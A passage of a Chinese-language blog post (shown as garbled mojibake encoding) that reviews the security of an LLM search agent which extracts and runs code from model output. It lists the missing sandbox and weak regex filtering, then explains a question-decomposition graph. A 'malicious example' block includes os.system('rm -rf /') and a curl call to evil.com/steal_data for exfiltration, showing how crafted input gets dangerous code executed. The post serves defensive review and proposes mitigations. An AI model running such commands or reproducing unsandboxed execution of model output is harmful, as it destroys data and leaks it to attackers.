<li>ç³»ç»Ÿè°ƒç”¨é£é™©: æ¶æ„ä»£ç å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ–‡ä»¶æ“ä½œã€ç½‘ç»œè¯·æ±‚ç­‰</li>
</ul>
<h3 id="2-ä»£ç æå–æœºåˆ¶ä¸å¤Ÿå®‰å…¨">2. ä»£ç æå–æœºåˆ¶ä¸å¤Ÿå®‰å…¨</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>def extract_code(text: str) -&gt; str:
</span></span><span style="display:flex;"><span>    text = re.sub(r&#34;from ([\w.]+) import WebSearchGraph&#34;, &#34;&#34;, text)
</span></span><span style="display:flex;"><span>    triple_match = re.search(r&#34;```[^\n]*\n(.+?)```&#34;, text, re.DOTALL)
</span></span><span style="display:flex;"><span>    single_match = re.search(r&#34;`([^`]*)`&#34;, text, re.DOTALL)
</span></span><span style="display:flex;"><span>    if triple_match:
</span></span><span style="display:flex;"><span>        return triple_match.group(1)
</span></span><span style="display:flex;"><span>    elif single_match:
</span></span><span style="display:flex;"><span>        return single_match.group(1)
</span></span><span style="display:flex;"><span>    return text
</span></span></code></pre></div><p>é—®é¢˜ï¼š</p>
<ul>
<li>ç®€å•çš„æ­£åˆ™è¿‡æ»¤: åªæ˜¯ç§»é™¤äº†WebSearchGraphçš„importï¼Œä½†æ²¡æœ‰é™åˆ¶å…¶ä»–å±é™©æ“ä½œ</li>
<li>å›é€€æœºåˆ¶: å¦‚æœæ²¡æœ‰åŒ¹é…åˆ°ä»£ç å—ï¼Œç›´æ¥è¿”å›åŸæ–‡æœ¬æ‰§è¡Œ</li>
</ul>
<h3 id="3-ç¼ºä¹ä»£ç æ²™ç®±">3. ç¼ºä¹ä»£ç æ²™ç®±</h3>
<p>å½“å‰å®ç°æ²¡æœ‰ä»»ä½•æ²™ç®±æœºåˆ¶ï¼š</p>
<ul>
<li>æ²¡æœ‰é™åˆ¶å¯ç”¨çš„æ¨¡å—å’Œå‡½æ•°</li>
<li>æ²¡æœ‰é™åˆ¶æ–‡ä»¶ç³»ç»Ÿè®¿é—®</li>
<li>æ²¡æœ‰é™åˆ¶ç½‘ç»œè®¿é—®</li>
<li>æ²¡æœ‰èµ„æºä½¿ç”¨é™åˆ¶ï¼ˆCPUã€å†…å­˜ã€æ—¶é—´ï¼‰</li>
</ul>
<h3 id="4-æ½œåœ¨çš„æ³¨å…¥æ”»å‡»">4. æ½œåœ¨çš„æ³¨å…¥æ”»å‡»</h3>
<p>æ¶æ„ç”¨æˆ·å¯èƒ½é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¾“å…¥æ¥æ‰§è¡Œå±é™©ä»£ç ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span># æ¶æ„ç¤ºä¾‹
</span></span><span style="display:flex;"><span>&#34;&#34;&#34;
</span></span><span style="display:flex;"><span>graph = WebSearchGraph()
</span></span><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>os.system(&#34;rm -rf /&#34;)  # åˆ é™¤ç³»ç»Ÿæ–‡ä»¶
</span></span><span style="display:flex;"><span>import subprocess
</span></span><span style="display:flex;"><span>subprocess.run([&#34;curl&#34;, &#34;evil.com/steal_data&#34;])  # æ•°æ®æ³„éœ²
</span></span><span style="display:flex;"><span>&#34;&#34;&#34;
</span></span></code></pre></div><h2 id="æ›¿ä»£æ–¹æ¡ˆ">æ›¿ä»£æ–¹æ¡ˆ</h2>
<ol>
<li>
<p>ä½¿ç”¨ASTè§£æå’Œç™½åå•</p>
</li>
<li>
<p>ä½¿ç”¨å—é™çš„æ‰§è¡Œç¯å¢ƒ</p>
</li>
<li>
<p>ä½¿ç”¨ä¸“é—¨çš„æ²™ç®±åº“</p>
</li>
<li>
<p>é¿å…åŠ¨æ€ä»£ç </p>
</li>
</ol>
<h1 id="å…¶ä»–">å…¶ä»–</h1>
<h2 id="å›¾çš„æ¦‚å¿µ">å›¾çš„æ¦‚å¿µ</h2>
<p>è¿™é‡Œç”¨åˆ°çš„â€œå›¾â€å…¶å®æ˜¯ä¸€å¼ ã€Œé—®é¢˜æ‹†è§£ + æœç´¢ç»“æœã€çš„æµç¨‹å›¾â€”â€”èŠ‚ç‚¹å°±æ˜¯â€œè¦è§£å†³çš„å°é—®é¢˜â€ï¼Œè¾¹è¡¨ç¤ºâ€œå…ˆè§£å†³è°ï¼Œå†è§£å†³è°â€ã€‚</p>
<ol>
<li>å›¾é•¿ä»€ä¹ˆæ ·ï¼Ÿ</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>è¾¹ï¼ˆç®­å¤´ï¼‰åªè¡¨ç¤ºâ€œä¾èµ–â€æˆ–â€œé¡ºåºâ€ï¼š
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root â†’ å­é—®é¢˜1 â†’ å­é—®é¢˜2 â†’ response
</span></span><span style="display:flex;"><span>Â      â†˜ å­é—®é¢˜3 â†—
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>å¦‚æœå­é—®é¢˜ä¹‹é—´æ²¡æœ‰ä¾èµ–ï¼Œå¯ä»¥å¹¶åˆ—ï¼š
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root â†’ A
</span></span><span style="display:flex;"><span>root â†’ B
</span></span><span style="display:flex;"><span>Aã€B â†’ response
</span></span></code></pre></div><ol start="2">
<li>å›¾åœ¨ä»£ç é‡Œæ€ä¹ˆè¡¨ç¤ºï¼Ÿ</li>
</ol>
<ul>
<li>nodesï¼šå­—å…¸
key æ˜¯èŠ‚ç‚¹åå­—ï¼Œvalue é‡Œå­˜â€œé—®é¢˜å†…å®¹ / æœåˆ°çš„ç­”æ¡ˆ / å¯¹è¯è®°å¿†â€ã€‚</li>
<li>adjacency_listï¼šå­—å…¸
key æ˜¯èµ·å§‹èŠ‚ç‚¹ï¼Œvalue æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œåˆ—è¡¨é‡Œæ¯ä¸ªå…ƒç´ æ˜¯â€œä¸€æ¡ç®­å¤´â€æŒ‡å‘è°ã€‚</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>nodes = {
</span></span><span style="display:flex;"><span>  &#34;root&#34;: {&#34;content&#34;:&#34;å“ªå®¶å¤§æ¨¡å‹APIæœ€ä¾¿å®œï¼Ÿ&#34;},
</span></span><span style="display:flex;"><span>  &#34;provider&#34;: {&#34;content&#34;:&#34;æœ‰å“ªäº›å¤§æ¨¡å‹APIï¼Ÿ&#34;},
</span></span><span style="display:flex;"><span>  &#34;price&#34;: {&#34;content&#34;:&#34;OpenAIä»·æ ¼ï¼Ÿ&#34;}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>adjacency_list = {
</span></span><span style="display:flex;"><span>  &#34;root&#34;: [{&#34;id&#34;:&#34;...&#34;, &#34;name&#34;:&#34;provider&#34;}],
</span></span><span style="display:flex;"><span>  &#34;provider&#34;: [{&#34;id&#34;:&#34;...&#34;, &#34;name&#34;:&#34;price&#34;}]
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ol>
<li>å›¾æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</li>
</ol>

  </article>
<div class="px-2 mb-2">
  
  <script src="https://utteranc.es/client.js"
    repo="HuizhiXu/huizhixu.github.io"
    issue-term="pathname"
    theme="github-light"
    crossorigin="anonymous"
    async>
  </script>
  
</div>
<div class="bg-blue-100 dark:bg-gray-900">
  <div class="container px-4 py-12 mx-auto max-w-4xl grid grid-cols-1 md:grid-cols-2 gap-4 items-center">
    <div>
      <div class="text-2xl font-bold mb-2">Sein heiÃŸt werden, leben heiÃŸt lernen.</div>
      <p class="opacity-60">Der einfache Weg is immer verkehrt.</p>
    </div>

    <ul class="flex justify-center gap-x-3 flex-wrap gap-y-2">
      

      
      <li>
        <a
          href="https://twitter.com/"
          target="_blank"
          rel="noopener"
          aria-label="Twitter"
          class="p-1 inline-block rounded-full border border-transparent text-gray-500 hover:text-gray-800 hover:border-gray-800 cursor-pointer transition-colors dark:text-gray-600 dark:hover:border-gray-300 dark:hover:text-gray-300"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            stroke-width="1.5"
            stroke="currentColor"
            fill="none"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <path stroke="none" d="M0 0h24v24H0z" fill="none" />
            <path
              d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z"
            />
          </svg>
        </a>
      </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      
      <li>
        <a
          href="https://github.com/"
          target="_blank"
          rel="noopener"
          aria-label="GitHub"
          class="p-1 inline-block rounded-full border border-transparent text-gray-500 hover:text-gray-800 hover:border-gray-800 cursor-pointer transition-colors dark:text-gray-600 dark:hover:border-gray-300 dark:hover:text-gray-300"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            stroke-width="1.5"
            stroke="currentColor"
            fill="none"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <path stroke="none" d="M0 0h24v24H0z" fill="none" />
            <path
              d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"
            />
          </svg>
        </a>
      </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      
    </ul>
  </div>
</div>

    </main><footer class="container p-6 mx-auto flex justify-between items-center">
  <span class="text-sm font-light">
    
    Copyright Â© 2012 - Huizhi Xu Â· All rights reserved
    
  </span>
  <span onclick="window.scrollTo({top: 0, behavior: 'smooth'})" class="p-1 cursor-pointer">
    <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" stroke-width="1.5"
      stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
      <path d="M18 15l-6 -6l-6 6h12" />
    </svg>
  </span>
</footer>

<div class="search-ui absolute top-0 left-0 w-full h-full bg-white dark:bg-gray-800 hidden">
  <div class="container max-w-3xl mx-auto p-12">
    <div class="relative">
      <div class="my-4 text-center text-2xl font-bold">Search</div>

      <span class="p-2 absolute right-0 top-0 cursor-pointer close-search">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.5"
          stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
          <line x1="18" y1="6" x2="6" y2="18" />
          <line x1="6" y1="6" x2="18" y2="18" />
        </svg>
      </span>
    </div>

    <input type="search" class="py-2 px-3 w-full dark:text-black border dark:border-transparent"
      placeholder="Enter search query" />

    <div class="search-results text-lg font-medium my-4 hidden">Results</div>
    <ul class="search-list my-2">

    </ul>

    <div class="no-results text-center my-8 hidden">
      <div class="text-xl font-semibold mb-2">No results found</div>
      <p class="font-light text-sm">Try adjusting your search query</p>
    </div>
  </div>
</div>





<script src="http://localhost:1313/js/scripts.min.js"></script>




<script>
  const languageMenuButton = document.querySelector('.language-switcher');
  const languageDropdown = document.querySelector('.language-dropdown');
  languageMenuButton.addEventListener('click', (evt) => {
    evt.preventDefault()
    if (languageDropdown.classList.contains('hidden')) {
      languageDropdown.classList.remove('hidden')
      languageDropdown.classList.add('flex')
    } else {
      languageDropdown.classList.add('hidden');
      languageDropdown.classList.remove('flex');
    }
  })
</script>



<script>
  
  const darkmode = document.querySelector('.toggle-dark-mode');
  function toggleDarkMode() {
    if (document.documentElement.classList.contains('dark')) {
      document.documentElement.classList.remove('dark')
      localStorage.setItem('darkmode', 'light')
    } else {
      document.documentElement.classList.add('dark')
      localStorage.setItem('darkmode', 'dark')
    }
  }
  if (darkmode) {
    darkmode.addEventListener('click', toggleDarkMode);
  }

  const darkStorage = localStorage.getItem('darkmode');
  const isBrowserDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

  if (!darkStorage && isBrowserDark) {
    document.documentElement.classList.add('dark');
  }

  if (darkStorage && darkStorage === 'dark') {
    toggleDarkMode();
  }
</script>


<script>
  const mobileMenuButton = document.querySelector('.mobile-menu-button')
  const mobileMenu = document.querySelector('.mobile-menu')
  function toggleMenu() {
    mobileMenu.classList.toggle('hidden');
    mobileMenu.classList.toggle('flex');
  }
  if(mobileMenu && mobileMenuButton){
    mobileMenuButton.addEventListener('click', toggleMenu)
  }
</script>
</body>
</html>
